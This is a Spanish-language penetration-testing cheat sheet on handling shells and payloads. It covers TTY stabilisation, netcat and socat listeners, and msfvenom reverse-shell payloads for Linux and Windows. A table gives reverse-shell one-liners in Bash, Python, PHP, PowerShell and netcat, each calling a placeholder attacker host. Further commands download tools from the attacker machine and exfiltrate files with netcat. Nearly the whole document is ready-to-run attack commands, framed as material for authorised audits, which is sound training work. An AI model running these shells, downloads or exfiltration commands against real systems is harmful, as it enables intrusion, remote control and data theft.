# 03.1 Gestión Avanzada de Shells, Payloads y Explotación

## 1. CheatSheet & Comandos de Explotación Directa

### Tratamiento de TTY (estabilización completa de shell)

Una reverse shell cruda no tiene autocompletado, no soporta `Ctrl+C` sin matar la sesión y no deja usar editores interactivos. Estabilizarla es el primer paso siempre, antes de hacer nada más:

```bash
# Paso 1: Spawn de PTY con Python
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Paso 2: Suspender la shell con Ctrl+Z y configurar la terminal local
stty raw -echo; fg

# Paso 3: Ajustar variables de entorno y dimensiones
export TERM=xterm-256color
stty rows 38 columns 116
```

Alternativas cuando no hay Python en el objetivo:

```bash
# script (casi siempre presente)
script -qc /bin/bash /dev/null

# socat (si está disponible en ambos lados — da una TTY completa de verdad)
socat file:`tty`,raw,echo=0 tcp-listen:4444
# en el objetivo:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATACANTE:4444
```

## 2. Listeners y generación de payloads

```bash
# Listener estándar
nc -lvnp 4444

# Listener con socat (da TTY completa directamente, sin paso 1-2-3 de arriba)
socat -d -d TCP-LISTEN:4444 STDOUT

# Generación de payloads con msfvenom (Linux, ejemplo reverse TCP)
msfvenom -p linux/x64/shell_reverse_tcp LHOST=ATACANTE LPORT=4444 -f elf -o shell.elf

# Windows
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATACANTE LPORT=4444 -f exe -o shell.exe
```

## 3. One-liners de reverse shell por lenguaje disponible

Cuando no hay forma de subir un binario, se usa lo que ya está instalado en el objetivo:

| Lenguaje | One-liner |
|---|---|
| Bash | `bash -i >& /dev/tcp/ATACANTE/4444 0>&1` |
| Python3 | `python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("ATACANTE",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("bash")'` |
| PHP | `php -r '$sock=fsockopen("ATACANTE",4444);exec("/bin/sh -i <&3 >&3 2>&3");'` |
| PowerShell | `powershell -nop -c "$c=New-Object System.Net.Sockets.TCPClient('ATACANTE',4444);..."` (usar generador de Nishang/`Invoke-PowerShellTcp` en lugar de escribir a mano, el string completo es largo y frágil) |
| Netcat con `-e` | `nc -e /bin/sh ATACANTE 4444` (solo si el `nc` del objetivo soporta `-e`, cada vez menos habitual) |

Herramienta recomendada en lugar de memorizar sintaxis: **revshells.com** o el payload generator de `pwncat` — reducen el error humano de escapar comillas mal en campo.

## 4. Transferencia de ficheros al/desde el objetivo

```bash
# Servidor HTTP simple desde la máquina atacante
python3 -m http.server 8000

# Descarga en el objetivo (Linux)
curl http://ATACANTE:8000/linpeas.sh -o /tmp/linpeas.sh
wget http://ATACANTE:8000/linpeas.sh -O /tmp/linpeas.sh

# Descarga en el objetivo (Windows PowerShell)
Invoke-WebRequest -Uri http://ATACANTE:8000/winPEAS.exe -OutFile winPEAS.exe

# Exfiltración rápida con netcat (sin servidor HTTP)
nc -lvnp 4445 > fichero_recibido   # atacante
nc ATACANTE 4445 < fichero_a_enviar  # objetivo
```

## 5. Persistencia de la sesión (solo en el marco de la auditoría autorizada)

```bash
# Multiplexado con tmux dentro de la shell obtenida — sobrevive a caídas de red sin perder el contexto
tmux new -s audit

# Upgrade a Meterpreter si se trabaja con Metasploit (ver 03.2)
```

## 6. Buenas prácticas de campo

| Práctica | Por qué |
|---|---|
| Documentar el comando exacto de cada payload usado | Es la evidencia reproducible que exige el informe técnico |
| Nunca reutilizar el mismo puerto/payload sin anotarlo | Facilita correlacionar qué shell corresponde a qué vector cuando hay varias sesiones abiertas |
| Cerrar/matar shells al terminar la fase | Una shell olvidada abierta es, en sí misma, una vulnerabilidad introducida por el propio auditor |
| Preferir binarios firmados/conocidos sobre compilar en el objetivo | Minimiza el riesgo de dejar artefactos que un AV/EDR del cliente marque como malware real después de la auditoría |

## Siguiente paso

Con acceso inicial estable, comparar el enfoque manual frente a frameworks como Metasploit en `02-Explotacion-Manual-vs-Metasploit.md`, y después escalar privilegios en `04-Post-Explotacion-y-Privilegios/`.
